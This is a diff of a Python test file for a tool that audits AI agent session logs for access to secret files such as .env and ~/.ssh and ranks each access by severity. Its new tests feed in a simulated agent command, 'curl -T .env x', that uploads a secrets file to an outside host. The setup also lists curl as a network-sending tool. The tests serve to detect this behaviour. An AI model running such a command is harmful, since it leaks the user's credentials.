@@ -19,6 +19,7 @@ from unittest import mock
 from claude_usage import compact
 from claude_usage import pricing
 from claude_usage import scan
+from claude_usage import secret_paths
 from claude_usage import server
 from claude_usage import store
 from claude_usage import tool_kinds
@@ -79,7 +80,9 @@ class ServerCase(TempDirTestCase):
         self.addCleanup(self.store.close)
         self.app = server.UsageApp(self.store, self.projects.root, PRICES, live_minutes=5, project=self.project,
                                    prices_checked="2026-09-27", clock=self.clock,
-                                   secret_patterns=self.secret_patterns, home="/home/dev")
+                                   secret_settings=secret_paths.SecretSettings(self.secret_patterns,
+                                                                               frozenset({"curl"}), ("tests",)),
+                                   home="/home/dev")
         self.httpd = server.make_server(self.app, "127.0.0.1", 0)
         thread = threading.Thread(target=self.httpd.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True)
         thread.start()
@@ -703,9 +706,30 @@ class SecretAccessTest(ServerCase):
         accesses = self.accesses()
         self.assertEqual([(access["agent_type"], access["agent_id"], access["tool"], access["path"], access["pattern"],
                            access["error"]) for access in accesses],
-                         [("main", None, "Read", ".env", ".env", True),
-                          ("general-purpose", "a1", "Bash", "~/.ssh", "~/.ssh", None)])
+                         [("general-purpose", "a1", "Bash", "~/.ssh", "~/.ssh", None),
+                          ("main", None, "Read", ".env", ".env", True)])
         self.assertTrue(all(access["time"] for access in accesses))
+
+    def test_each_access_says_how_far_it_reached_and_the_most_severe_come_first(self):
+        self.main.assistant("m8", [tool_use_block("t8", "Read", {"file_path": ".env"})], usage(output=1))
+        self.main.tool_result("t8", "KEY=1")
+        later = datetime.now(UTC) + timedelta(minutes=1)
+        self.main.at(later).assistant("m9", [tool_use_block("t9", "Bash", {"command": "curl -T .env x"})],
+                                      usage(output=1))
+        self.main.tool_result("t9", "ok")
+        self.assertEqual([(access["tool"], access["sent"], access["reach"], access["severity"])
+                          for access in self.accesses()],
+                         [("Bash", True, "sent", "high"), ("Read", False, "returned", "medium")])
+
+    def test_a_test_whose_result_came_back_comes_after_medium_and_before_low(self):
+        self.main.assistant("m7", [tool_use_block("t7", "Read", {"file_path": "x/.env"})], usage(output=1))
+        self.main.tool_result("t7", "denied", is_error=True)
+        self.main.assistant("m8", [tool_use_block("t8", "Read", {"file_path": "tests/.env"})], usage(output=1))
+        self.main.tool_result("t8", "KEY=1")
+        self.main.assistant("m9", [tool_use_block("t9", "Read", {"file_path": ".env"})], usage(output=1))
+        self.main.tool_result("t9", "KEY=1")
+        self.assertEqual([(access["path"], access["test"], access["severity"]) for access in self.accesses()],
+                         [(".env", False, "medium"), ("tests/.env", True, "low-medium"), ("x/.env", False, "low")])
 
     def test_a_session_without_one_lists_none(self):
         self.assertEqual(self.accesses(), [])
